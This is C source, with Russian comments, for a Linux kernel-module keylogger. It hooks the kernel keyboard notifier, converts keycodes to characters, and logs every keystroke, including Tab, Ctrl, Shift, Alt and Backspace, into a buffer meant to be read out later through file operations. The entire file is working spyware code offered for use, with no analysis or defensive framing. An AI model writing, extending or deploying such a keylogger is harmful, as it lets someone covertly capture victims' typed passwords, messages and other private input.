/*
 * Модуль кейлоггера, который устанавливает обработчик уведомления от клавиатуры.
 *
 * Клавиши регистрирует в key_str[BUFFER_SIZE].
 *
 * Потом можно получить эти данные через файловые операции.
 *
 * ВАЖНО после достижения лимита BUFFER_SIZE, логирование прикратится, т.к. нужно сбрасывать и очищать лог.
 */

#include <linux/input.h>
#include <linux/keyboard.h>
#include <linux/uaccess.h>

#define BUFFER_SIZE 0x1000

char key_str[BUFFER_SIZE];
static char *pkey_str;

#define add_string_key_str(key)										\
if(pkey_str + strlen(key) < key_str + sizeof(char)*BUFFER_SIZE){	\
	strncpy(pkey_str,key,strlen(key));								\
	pkey_str += strlen(key);											\
}


#define SPACE_KEY_CODE	0x39
#define FIRST_KEY_CODE	0x2
#define LAST_KEY_CODE	0x35

// Таблица для конвертации кода в аски
static const char character_table[] = {
	'1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '\0', '\0',
	'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n', '\0',
	'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '\n', '\0', '\\',
	'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/'
};


// Обработка специальных кнопок
static void add_special_keycode(int key_code){
	switch(key_code){
		case 0x0f:
			add_string_key_str("_TAB_")
			break;

		case 0x0e:
			add_string_key_str("_BACKSPACE_")
			break;

		case 0x1d:
		case 0xe0:
			add_string_key_str("_CTRL_")
			break;

		case 0x2a:
		case 0x36:
			add_string_key_str("_SHIFT_")
			break;

		case 0x38:
		case 0x64:
			add_string_key_str("_ALT_")
			break;

		case 0x3a:
			add_string_key_str("_CAPSLOCK_")
			break;

		default:
			break;
	}
}

// Получение по коду клавиши её аски код
static void add_keycode(int key_code) {
	char ascii = '\0';

	if (key_code >= FIRST_KEY_CODE && key_code <= LAST_KEY_CODE) {	// Если в таблице
		ascii = character_table[key_code - FIRST_KEY_CODE];
	} else if (key_code == SPACE_KEY_CODE) {						// Нажат пробел
		ascii = ' ';
	}

	// FIXME Добавление клавиши в лог. Ограничен размер, лучше сбрасывать буфер куда-то и очищать его при переполнении
	if (ascii && pkey_str < key_str + sizeof(char)*BUFFER_SIZE) {
		*(pkey_str++) = ascii;
	}

	// Обработка специальных клавиш
	add_special_keycode(key_code);
}

// Эта функция будет вызвана, когда наступит уведомление от клавиатуры
static int keylogger_notifier(struct notifier_block *nb, unsigned long action, void *data)
{
	struct keyboard_notifier_param *param = (struct keyboard_notifier_param *) data;
	int key_code;

	// Проверка что кнопка нажата
	if (action == KBD_KEYCODE && param->down == 1) {
		// Получение кода кнопки
		key_code = param->value;
		add_keycode(key_code);
	}

	return NOTIFY_OK;
}

//Интерфейсные функции для работы с кейлоггером

static struct notifier_block nb = {
	.notifier_call = keylogger_notifier
};

int run_keylogger(void)
{
	memset(key_str, 0, sizeof(key_str));
	pkey_str = key_str;

	// Регистрация обработчика уведомления от клавиатуры
	if (register_keyboard_notifier(&nb))
	{
		return -1;
	}

	return 0;
}

void stop_keylogger(void)
{
	unregister_keyboard_notifier(&nb);
}
